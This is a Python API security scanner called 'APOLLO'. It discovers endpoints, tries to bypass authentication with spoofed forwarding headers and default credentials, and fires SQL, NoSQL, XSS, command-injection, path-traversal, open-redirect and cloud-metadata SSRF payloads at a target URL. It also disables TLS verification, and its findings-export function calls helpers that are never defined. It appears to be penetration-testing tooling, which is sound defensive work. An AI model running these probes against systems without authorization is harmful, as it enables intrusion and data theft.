#!/usr/bin/env python3
"""
APOLLO API Security Tester - REST/GraphQL endpoint discovery,
authentication bypass, injection testing, rate limiting checks.
"""
import sys, os, json, urllib.request, urllib.error, urllib.parse, ssl, socket, time, re, threading, queue

COMMON_API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3", "/graphql", "/rest", "/swagger",
    "/openapi.json", "/swagger.json", "/api-docs", "/v1", "/v2",
    "/api/health", "/api/status", "/api/version", "/api/users", "/api/admin",
    "/api/login", "/api/auth", "/api/token", "/api/keys", "/api/config",
    "/api/internal", "/api/metrics", "/api/export", "/api/import",
]

COMMON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; APOLLO/3.0)",
    "Accept": "application/json, text/plain, */*",
}

AUTH_BYPASS_PATHS = [
    "/admin", "/api/admin", "/api/users/1", "/api/config",
    "/api/internal/status", "/api/backup", "/api/logs",
    "/api/debug", "/api/shell", "/api/exec",
]

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Proxy-User-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
    {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},
    {"Authorization": "Bearer admin"},
    {"Cookie": "admin=true; session=test"},
]

INJECTION_PAYLOADS = [
    {"name": "SQLi basic", "payload": "' OR '1'='1"},
    {"name": "SQLi comment", "payload": "admin'--"},
    {"name": "NoSQL injection", "payload": '{"$gt": ""}'},
    {"name": "XSS", "payload": "<script>alert(1)</script>"},
    {"name": "Command injection", "payload": "; whoami"},
    {"name": "Command injection 2", "payload": "| whoami"},
    {"name": "Path traversal", "payload": "../../etc/passwd"},
    {"name": "LDAP injection", "payload": "*)(&)"},
    {"name": "Open redirect", "payload": "http://evil.com"},
    {"name": "SSRF test", 'payload': 'http://169.254.169.254/latest/meta-data/'},
]

class APITester:
    def __init__(self, base_url, timeout=10):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.results = {"endpoints": [], "auth_bypass": [], "injection": [], "info": []}
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self.ctx = ctx

    def _request(self, path, method="GET", headers=None, data=None):
        url = f"{self.base_url}{path}"
        req_headers = {**COMMON_HEADERS}
        if headers: req_headers.update(headers)
        body = json.dumps(data).encode() if data else None
        if data: req_headers["Content-Type"] = "application/json"
        try:
            req = urllib.request.Request(url, data=body, headers=req_headers, method=method)
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx)
            content = resp.read().decode("utf-8", errors="ignore")[:1000]
            ct = resp.headers.get("Content-Type", "")
            return {"status": resp.status, "body": content, "headers": dict(resp.headers), "content_type": ct}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": e.read().decode("utf-8", errors="ignore")[:500], "error": str(e)}
        except Exception as e:
            return {"status": 0, "error": str(e)}

    def discover_endpoints(self, paths=None):
        if paths is None: paths = COMMON_API_PATHS
        results = []
        lock = threading.Lock()
        def check(path):
            resp = self._request(path)
            if resp["status"] not in (0, 404):
                with lock:
                    results.append({"path": path, "status": resp["status"], "type": resp.get("content_type", "")})
        threads = []
        for path in paths:
            t = threading.Thread(target=check, args=(path,))
            threads.append(t)
            t.start()
        for t in threads: t.join(timeout=30)
        for t in threads:
            if t.is_alive():
                import ctypes
                try: ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(t.ident), ctypes.py_object(SystemExit))
                except: pass
        self.results["endpoints"] = sorted(results, key=lambda x: x["path"])
        return results

    def _is_auth_response(self, resp):
        """Check if response indicates an authentication challenge."""
        body_lower = resp.get("body", "").lower()
        if resp["status"] in (401, 403):
            return True
        if "unauthorized" in body_lower or "forbidden" in body_lower:
            return True
        if "access denied" in body_lower or "not authorized" in body_lower:
            return True
        if "login" in body_lower and "password" in body_lower:
            return True
        if resp["status"] < 400:
            return False
        return resp["status"] != 404

    def test_auth_bypass(self, paths=None):
        if paths is None: paths = AUTH_BYPASS_PATHS
        results = []
        baseline = {p: self._request(p) for p in paths}
        for path in paths:
            for h in AUTH_BYPASS_HEADERS:
                resp = self._request(path, headers=h)
                baseline_blocked = self._is_auth_response(baseline.get(path, {}))
                now_blocked = self._is_auth_response(resp)
                if baseline_blocked and not now_blocked and resp["status"] not in (0,):
                    results.append({"path": path, "status": resp["status"],
                                    "header_used": str(list(h.keys())[0]) + ": " + str(list(h.values())[0])[:30],
                                    "detail": f"Baseline={baseline.get(path,{}).get('status','?')} -> {resp['status']}"})
        self.results["auth_bypass"] = results
        return results

    def test_injection(self, endpoints=None):
        if endpoints is None: endpoints = [e["path"] for e in self.results["endpoints"]]
        results = []
        for ep in endpoints[:10]:
            for test in INJECTION_PAYLOADS:
                test_url = f"{ep}?q={urllib.parse.quote(test['payload'])}"
                resp = self._request(test_url)
                if resp["status"] not in (0, 404, 400):
                    results.append({"endpoint": ep, "test": test["name"], "status": resp["status"]})
        self.results["injection"] = results
        return results

    def check_rate_limiting(self, path="/api/login"):
        results = []
        for i in range(20):
            resp = self._request(path)
            if resp["status"] in (429, 503):
                results.append({"attempt": i+1, "status": resp["status"], "rate_limited": True})
                break
        self.results["rate_limiting"] = results
        return results

    def check_info_disclosure(self):
        results = []
        checks = [
            ("Server header", "/", "Server", lambda h: h.get("Server", "")),
            ("X-Powered-By", "/", "X-Powered-By", lambda h: h.get("X-Powered-By", "")),
            ("Stack trace test", "/nonexistent<script>", "body", lambda r: "Traceback" in r["body"] or "Stack trace" in r["body"] or "at " in r["body"]),
        ]
        for name, path, source, fn in checks:
            resp = self._request(path)
            val = fn(resp) if source == "body" else resp.get("headers", {}).get(source, "")
            if val:
                results.append({"finding": name, "detail": val[:200]})
        self.results["info"] = results
        return results

    def full_test(self):
        self.discover_endpoints()
        self.test_auth_bypass()
        self.check_info_disclosure()
        return self.results

def analyze_results(results):
    findings = []
    for ep in results.get("endpoints", []):
        findings.append({
            "type": "API Endpoint",
            "path": ep["path"],
            "status": ep["status"],
            "risk": "low",
            "mitre": "T1595"
        })
    for bypass in results.get("auth_bypass", []):
        findings.append({
            "type": "Auth Bypass",
            "path": bypass["path"],
            "status": bypass["status"],
            "risk": "critical",
            "mitre": "T1078"
        })
    for inj in results.get("injection", []):
        findings.append({
            "type": f"Injection: {inj['test']}",
            "path": inj["endpoint"],
            "status": inj["status"],
            "risk": "high",
            "mitre": "T1190"
        })
    for info in results.get("info", []):
        findings.append({
            "type": "Info Disclosure",
            "detail": info["detail"],
            "risk": "medium",
            "mitre": "T1592"
        })
    return findings

def inject_findings(project_id, target, results):
    pid = get_project_id()
    hid = add_host(pid, target, tags="api")
    findings = analyze_results(results)
    for f in findings:
        add_vulnerability(hid, f.get("type", "API Issue"),
                        severity=f.get("risk", "medium"),
                        description=f"{f.get('path', '')} {f.get('detail', '')}",
                        mitre_id=f.get("mitre", ""))
    return len(findings)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        url = sys.argv[1]
        tester = APITester(url)
        if len(sys.argv) > 2 and sys.argv[2] == "full":
            results = tester.full_test()
        elif len(sys.argv) > 2 and sys.argv[2] == "inject":
            results = tester.full_test()
            count = inject_findings(None, urllib.parse.urlparse(url).hostname or url, results)
            print(f"Injected {count} findings")
            print(json.dumps(results, indent=2))
            sys.exit(0)
        else:
            results = tester.discover_endpoints()
        print(json.dumps(results, indent=2))
    else:
        print("Usage:")
        print("  api_tester.py <url> [full|inject]")
        print("  Examples:")
        print("  api_tester.py https://example.com")
        print("  api_tester.py https://example.com full")
        print("  api_tester.py https://example.com inject")
